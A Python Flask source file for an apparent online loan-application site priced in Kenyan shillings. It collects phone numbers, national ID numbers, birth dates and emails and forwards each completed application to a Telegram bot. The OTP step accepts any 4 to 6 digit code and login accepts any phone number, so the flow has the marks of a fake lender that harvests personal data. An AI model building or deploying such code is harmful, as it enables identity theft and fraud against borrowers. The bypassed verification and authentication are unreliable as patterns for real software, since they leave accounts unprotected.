# app.py
from flask import Flask, render_template, request, session, redirect, url_for
import os
import logging
from datetime import datetime
from config import Config
from telegram_bot import telegram_bot

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)

# Loan products from config
LOAN_PRODUCTS = Config.LOAN_PRODUCTS

# Helper functions
def calculate_loan_details(amount):
    """Calculate interest and repayment details"""
    if amount <= 10000:
        product = LOAN_PRODUCTS['small']
    elif amount <= 30000:
        product = LOAN_PRODUCTS['medium']
    else:
        product = LOAN_PRODUCTS['large']
    
    interest = amount * (product['interest'] / 100)
    total = amount + interest
    
    return {
        'product': product,
        'interest': interest,
        'total': total,
        'interest_rate': product['interest'],
        'months': product['months']
    }

def generate_application_id():
    """Generate unique application ID"""
    return f"LN{datetime.now().strftime('%Y%m%d%H%M%S')}"

# Routes
@app.route('/')
def index():
    """Homepage - Landing page"""
    return render_template('index.html', 
                         app_name=Config.APP_NAME,
                         support_phone=Config.SUPPORT_PHONE)

@app.route('/apply', methods=['GET', 'POST'])
def apply():
    """Step 1: Phone number entry"""
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if phone and len(phone) >= 7:
            session['phone'] = phone
            # In production, send OTP via SMS
            # For demo, redirect to OTP verification
            return redirect(url_for('verify_otp'))
        else:
            error = "Please enter a valid phone number"
            return render_template('apply.html', error=error)
    
    return render_template('apply.html')

@app.route('/verify-otp', methods=['GET', 'POST'])
def verify_otp():
    """Step 2: OTP verification"""
    if 'phone' not in session:
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        otp = request.form.get('otp', '').strip()
        # Demo: accept any 4-6 digit code
        if otp and len(otp) >= 4 and otp.isdigit():
            session['verified'] = True
            return redirect(url_for('personal_info'))
        else:
            error = "Please enter a valid verification code"
            return render_template('verify_otp.html', 
                                 phone=session.get('phone'),
                                 error=error)
    
    return render_template('verify_otp.html', 
                         phone=session.get('phone'))

@app.route('/personal-info', methods=['GET', 'POST'])
def personal_info():
    """Step 3: Personal information"""
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        # Validate required fields
        required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
        for field in required:
            if not request.form.get(field, '').strip():
                error = f"Please fill in all required fields"
                return render_template('personal_info.html', error=error)
        
        # Save personal info
        session['first_name'] = request.form.get('first_name').strip()
        session['last_name'] = request.form.get('last_name').strip()
        session['middle_name'] = request.form.get('middle_name', '').strip()
        session['dob'] = request.form.get('dob')
        session['national_id'] = request.form.get('national_id').strip()
        session['email'] = request.form.get('email').strip()
        session['gender'] = request.form.get('gender')
        session['alt_phone'] = request.form.get('alt_phone', '').strip()
        
        return redirect(url_for('loan_amount'))
    
    return render_template('personal_info.html')

@app.route('/loan-amount', methods=['GET', 'POST'])
def loan_amount():
    """Step 4: Loan amount selection"""
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    if request.method == 'POST':
        try:
            amount = float(request.form.get('loan_amount', 0))
            if amount < Config.MIN_LOAN or amount > Config.MAX_LOAN:
                error = f"Loan amount must be between KES {Config.MIN_LOAN:,.0f} and KES {Config.MAX_LOAN:,.0f}"
                return render_template('loan_amount.html', error=error)
            
            # Calculate loan details
            details = calculate_loan_details(amount)
            
            # Generate application ID
            application_id = generate_application_id()
            
            # Prepare application data
            application_data = {
                'first_name': session.get('first_name', ''),
                'last_name': session.get('last_name', ''),
                'phone': session.get('phone', ''),
                'email': session.get('email', ''),
                'national_id': session.get('national_id', ''),
                'gender': session.get('gender', ''),
                'dob': session.get('dob', ''),
                'loan_amount': amount,
                'interest': details['interest'],
                'total': details['total'],
                'interest_rate': details['interest_rate'],
                'months': details['months'],
                'application_id': application_id
            }
            
            # Send to Telegram
            if Config.TELEGRAM_ENABLED:
                try:
                    telegram_bot.send_application(application_data)
                    telegram_bot.send_quick_notification(
                        f"🔔 New application from {application_data['first_name']} "
                        f"{application_data['last_name']} for KES {amount:,.2f}"
                    )
                    logger.info(f"Application {application_id} sent to Telegram")
                except Exception as e:
                    logger.error(f"Failed to send to Telegram: {e}")
            else:
                logger.warning("Telegram not configured - application not sent")
            
            # Store in session
            session['application_data'] = application_data
            
            return redirect(url_for('confirmation'))
            
        except ValueError:
            error = "Please enter a valid amount"
            return render_template('loan_amount.html', error=error)
    
    return render_template('loan_amount.html', 
                         min_loan=Config.MIN_LOAN,
                         max_loan=Config.MAX_LOAN)

@app.route('/confirmation')
def confirmation():
    """Step 5: Application confirmation"""
    if not session.get('verified'):
        return redirect(url_for('apply'))
    
    data = session.get('application_data', {})
    if not data:
        return redirect(url_for('loan_amount'))
    
    return render_template('confirmation.html',
                         first_name=data.get('first_name', ''),
                         last_name=data.get('last_name', ''),
                         amount=data.get('loan_amount', 0),
                         interest=data.get('interest', 0),
                         total=data.get('total', 0),
                         months=data.get('months', 0),
                         application_id=data.get('application_id', ''),
                         support_phone=Config.SUPPORT_PHONE)

@app.route('/dashboard')
def dashboard():
    """User dashboard"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    return render_template('dashboard.html',
                         phone=session.get('user_phone', ''),
                         app_name=Config.APP_NAME)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if phone:
            session['logged_in'] = True
            session['user_phone'] = phone
            return redirect(url_for('dashboard'))
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout user"""
    session.clear()
    return redirect(url_for('index'))

# Static pages
@app.route('/how-to-borrow')
def how_to_borrow():
    return render_template('how_to_borrow.html')

@app.route('/reviews')
def reviews():
    return render_template('reviews.html')

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

# Error handlers
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=Config.DEBUG, host='0.0.0.0', port=port)